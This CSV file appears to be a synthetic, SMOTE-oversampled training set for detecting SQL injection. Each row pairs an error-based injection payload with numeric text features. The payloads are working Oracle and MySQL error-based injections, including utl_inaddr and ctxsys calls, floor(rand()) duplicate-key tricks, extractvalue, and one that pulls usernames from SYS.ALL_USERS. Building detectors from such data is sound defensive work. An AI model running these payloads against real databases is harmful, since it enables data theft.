id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000112,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.8621267284660421,337.6032068511985,34.0,3.4880125317034287,81.04128274047937,52.86773561706615,146.34709424682646,57.34709424682646,0.24000488844319587,0.1565486113045189,0.4335710735386942,0.16987542671359107,0.0,0.17354712341323042,1.1735471234132304,0.0,0.0,2.1735471234132304,0.0,30.82645287658677,0.0,0.0,1.0,23.347094246826458,0.0,0.17354712341323048,0.1735471234132305,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.1735471234132305,1.0,0.17354712341323042,0.8264528765867696,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.173547123413231
SMOTE_000113,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,3.1111543373070303,227.75611636649086,38.63502077973051,3.8081124475990755,65.01307896297594,42.63502077973051,94.16202493567661,25.945991688107796,0.2839537805886443,0.1872287762535399,0.41419174258173985,0.11462570057607596,0.0,1.0,1.472995844053898,0.0,1.0,2.0,0.0,16.0,0.0,0.0,3.472995844053898,4.472995844053898,0.0,1.0,0.4729958440538978,0.5270041559461022,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.9459916881077957,0.0,1.0,0.47299584405389783,0.4729958440538979,0.5270041559461022,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5270041559461021,0.0,0.5270041559461022,0.5270041559461022,7.0
SMOTE_000114,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,0.6558534832952884,253.55209166560186,36.0,4.015671115205715,96.54917133273705,35.0,90.45666933299259,31.54625099987222,0.380541832223565,0.13822702183484206,0.35680788124287793,0.12442326469871494,1.5462509998722243,0.0,0.0,0.0,2.0,1.1820836666240746,0.0,18.0,0.0,2.0,5.8179163333759245,3.1820836666240737,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.36416733324814954,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.36416733324815
SMOTE_000115,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000025,1.7842483317345923,318.10090726040875,40.73033052304269,4.035733881972519,109.19099156912807,57.60661046085377,116.30330523042689,35.0,0.3438219480794266,0.18014733469901012,0.3657572744009752,0.11027344282058806,0.26966947695731136,0.7303305230426886,2.0,0.0,2.0,2.0,0.0,20.73033052304269,0.0,0.5393389539146227,5.730330523042689,6.730330523042689,0.2696694769573114,0.7303305230426886,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.190991569128066,2.190991569128066,1.0,1.2696694769573114,0.7303305230426886,0.26966947695731136,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.26966947695731136,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.921322092170755
SMOTE_000116,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,2.6130337853961034,212.7142074974509,33.88882805357293,3.8677119939075584,71.22234389285413,37.0,80.6664841607188,23.82537944387798,0.3356410143607127,0.1740172582984574,0.37838269280922177,0.11195903453160808,2.7619308341830293,0.0,0.41268972193899034,0.0,0.41268972193899034,1.5873102780610098,0.0,14.063448609694952,0.0,0.0,4.1746205561220195,2.41268972193899,1.0,0.0,0.0,0.41268972193899034,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.5873102780610097,0.4126897219389903,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.41268972193899034,0.0,1.0,1.0,5.412689721938991
SMOTE_000117,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,0.06787145480179055,276.6714413104197,36.98826576108642,3.928806143361463,98.9413288054321,35.0,104.8122521773827,37.917860327604934,0.3576366895650927,0.12652051605896958,0.37880754085716056,0.13703525351877716,0.011734238913581052,3.953063044345675,0.0,0.0,2.0,1.9882657610864187,0.0,19.976531522172838,1.9765315221728375,2.0,5.011734238913581,3.98826576108642,0.011734238913581274,0.988265761086419,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.9882657610864188,0.9882657610864187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.976531522172838
SMOTE_000118,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,1.6891368427657296,331.6148233020673,36.0,3.6755933737265387,92.0,48.0,135.0,56.61482330206729,0.2774308981200616,0.1447465555409017,0.40709968745878605,0.17072285888025066,0.0,0.0,2.2296466041345804,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,24.22964660413458,0.0,0.0,0.61482330206729,0.3851766979327099,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000119,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000022,2.2603418063435887,339.25796004660833,34.82029142191309,3.6986215712760457,99.07825146852144,46.23043713286964,136.76956286713036,57.17970857808691,0.2918093516510586,0.136414839605435,0.4032216883640091,0.16855412037949735,2.3594171561738158,0.0,0.410145710956546,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,22.410145710956545,0.5898542890434539,0.0,0.0,0.4101457109565462,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.1797085780869079,0.41014571095654606,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.589854289043454
SMOTE_000120,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,0.571497274322681,307.3181798217304,37.822443119429074,4.066768648483148,111.31320963457621,53.224431194290744,109.04687431371983,33.73366467914361,0.36248611437143874,0.17259770165156257,0.35488091278830636,0.11003527118869237,3.7336646791436117,0.0,0.0,0.0,2.0,1.0,0.0,19.822443119429074,0.0,0.17755688057092578,6.0,3.911221559714538,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.733664679143612,2.733664679143612,0.0,1.0887784402854628,0.9112215597145372,0.9112215597145372,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.08877844028546289,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.467329358287223
SMOTE_000121,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,4.238548055956698,270.30954790838433,42.36904520916157,4.27251981615943,131.28271339390605,18.717286606093946,90.04763832670747,30.261909581676868,0.4934918328728274,0.06429872652701124,0.3307122093582691,0.11149723124189227,2.184522604580783,0.0,0.8154773954192167,0.0,0.8154773954192167,3.184522604580783,0.0,14.077386977096083,0.0,4.961306511451959,2.6309547908384334,4.815477395419217,1.0,0.0,0.40773869770960836,0.0,0.0,1.0,1.0,0.0,0.0,0.40773869770960836,0.0,2.4077386977096085,0.0,1.5922613022903915,2.0,1.1845226045807833,0.40773869770960836,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4077386977096083,0.0,0.0,0.0,0.0,0.0,0.40773869770960836,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.40773869770960836,0.0,0.0,0.0,8.815477395419217
SMOTE_000122,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,0.0379616795650938,233.8654715454682,33.030574648757224,3.917980086915506,80.889931264474,44.95108056198845,83.03668957850867,24.987770140497112,0.3458543122218995,0.192198972584245,0.3550990006268579,0.10684771456699763,1.9877701404971115,0.0,0.006114929751444231,0.0,0.006114929751444231,1.9938850702485558,0.0,14.012229859502888,0.0,0.0,4.987770140497112,3.993885070248557,0.9938850702485558,0.0,0.0,0.006114929751444231,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.9938850702485558,0.0,0.9938850702485559,0.0,0.0,0.006114929751444231,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.006114929751444231,0.0,1.0,1.0,6.0
SMOTE_000123,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,1.824670738912413,337.5421301639223,33.37851084699353,3.5295256105287964,85.92064101091584,50.514043387974105,143.72893491803885,57.37851084699353,0.25430352886240387,0.14959839900912375,0.4260833383276692,0.17001473380080317,1.0,0.0,0.7570216939870525,0.0,0.0,2.3785108469935263,0.0,29.864467459019423,0.0,1.1355325409805792,0.6214891530064737,23.135532540980577,1.0,0.0,0.37851084699352633,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.3785108469935264,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.378510846993526
SMOTE_000124,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,1.1749415532779062,346.45224327206176,34.0,3.5282949260438374,84.58089730882469,55.817414424020576,147.52696576960824,58.52696576960823,0.2440803508459815,0.16105174568784378,0.42592329223963965,0.1689446112265351,0.0,0.7634828848041159,1.763482884804116,0.0,0.0,2.763482884804116,0.0,30.236517115195884,0.0,0.0,1.0,24.526965769608232,0.0,0.7634828848041157,0.7634828848041157,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.7634828848041159,1.0,0.7634828848041159,0.23651711519588403,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.763482884804116
SMOTE_000125,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.07091689134244505,274.03548756885544,36.01182918961848,4.029359261059901,107.89353729343367,35.0,97.09463351694785,34.047316758473926,0.39372574456460563,0.12772086135458194,0.3543108815708547,0.12424251250995771,3.952683241526076,0.0473167584739248,0.0,0.0,2.0,2.0,0.0,18.023658379236963,0.023658379236962346,2.0,5.0,4.0,0.9881708103815188,0.011829189618481284,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.9881708103815185,0.011829189618481117,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000126,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000003,1.0762224089346812,342.3209729500978,33.77674774584148,3.6079019782793647,91.09772069593932,52.10699098336595,141.3395135249511,57.77674774584149,0.2659402200704171,0.15217739759677998,0.4130843535108537,0.16879802882194922,1.0,0.0,1.5534954916829722,0.0,0.0,2.776747745841486,0.0,28.66975676247554,0.0,2.330243237524458,0.22325225415851424,24.330243237524456,1.0,0.0,0.776747745841486,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.7767477458414862,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.776747745841486
SMOTE_000127,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,1.1359331594128466,265.14301351125215,36.580785999262154,4.05410523054204,109.30676849833984,30.208515506087238,93.224891004796,32.40283850202908,0.416685670630374,0.11055357554186077,0.35101175122035994,0.1217490026074054,3.8548035001844614,0.0,0.0,0.0,1.7096070003689237,2.1451964998155386,0.0,16.838428001475695,0.0,2.2903929996310763,4.419214000737847,3.8548035001844623,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8548035001844616,0.0,2.8548035001844614,0.0,0.1451964998155383,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8548035001844616,0.0,0.0,0.0,0.0,0.0,0.8548035001844616,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8548035001844618,0.0,0.0,0.0,9.564410500553386
SMOTE_000128,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.0705542813050887,213.73196888830876,40.07141159885939,4.197526274804901,117.55343989116028,2.0,71.10711739828909,23.07141159885939,0.5498917292685117,0.009362612513832802,0.33279446628157283,0.10795119193608275,3.0,0.0,0.0,0.0,0.0,3.017852899714848,0.0,10.0,0.0,4.053558699144545,1.0,3.017852899714847,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.017852899714848,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.017852899714848
SMOTE_000129,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,2.054003443170196,215.071352039871,35.722162697677426,3.8117611702037877,67.55567460464515,37.0,86.16648809303229,24.349189342193547,0.3148378448114826,0.17210306778729587,0.3998871573805592,0.11317193002066239,1.9762159867096734,0.0,0.6745946710967755,0.0,0.6745946710967756,1.3254053289032246,0.0,15.372973355483877,0.0,0.0,3.6508106578064488,2.6745946710967763,1.0,0.0,0.0,0.6745946710967756,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.3254053289032245,0.6745946710967754,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6745946710967755,0.0,1.0,1.0,5.674594671096775
SMOTE_000130,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,3.059001085426866,309.2570322558515,40.462334310783376,4.019133597055189,108.38700293235014,52.24668621566761,113.6233431078338,35.0,0.3512063534786955,0.16771176184656078,0.3675887407457542,0.11349314392898953,0.5376656892166196,0.4623343107833802,2.0,0.0,2.0,2.0,0.0,20.46233431078338,0.0,1.0753313784332394,5.462334310783381,6.46233431078338,0.5376656892166197,0.4623343107833804,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.387002932350141,1.387002932350141,1.0,1.5376656892166198,0.4623343107833804,0.5376656892166197,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5376656892166196,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.84933724313352
SMOTE_000131,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,1.9429168111382595,266.1985235424878,37.52875764822114,4.003999487222168,98.9684623567187,38.057515296442276,96.64378824110568,32.52875764822114,0.37232584643101796,0.14273929711809213,0.36251993930489174,0.12241491714599816,1.0,0.0,0.7643788241105686,0.0,2.0,1.3821894120552844,0.0,18.76437882411057,0.0,2.0,5.6178105879447156,4.146568236165853,1.0,0.0,0.38218941205528434,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.3821894120552844,2.0,0.0,0.38218941205528423,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.764378824110569
SMOTE_000132,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,1.3778222452243012,334.19710616214553,33.59855308107277,3.4676793851838523,80.40144691892723,50.79565924321831,146.0,57.0,0.24058729976127452,0.151981500838569,0.4368717000611963,0.1705594993389602,0.40144691892722983,0.0,0.5985530810727703,0.0,0.0,2.0,0.0,31.0,0.0,0.0,1.0,22.59855308107277,0.4014469189272297,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.4014469189272297,0.5985530810727702,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000133,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.5307750957718317,336.602684756355,34.0,3.483457976421483,80.64107390254202,52.53422825211834,146.21369130084733,57.213691300847344,0.23954409361913154,0.15603946146805273,0.43443577493693836,0.16998066997587738,0.0,0.10684565042366889,1.106845650423669,0.0,0.0,2.106845650423669,0.0,30.89315434957633,0.0,0.0,1.0,23.213691300847337,0.0,0.106845650423669,0.10684565042366889,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.10684565042366898,1.0,0.106845650423669,0.893154349576331,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.106845650423669
SMOTE_000134,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,1.980639371896847,333.61321351517626,34.92452432321584,3.569974396330321,85.54714593929506,50.15095135356831,140.91511622231286,57.0,0.25651174976128166,0.15030283762503344,0.4223254339260841,0.17085997868760075,0.0,0.0,1.9245243232158447,0.0,0.0,2.0,0.0,29.613213515176234,0.0,1.3867864848237668,0.5377378383920779,23.92452432321584,0.0,0.0,0.4622621616079222,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
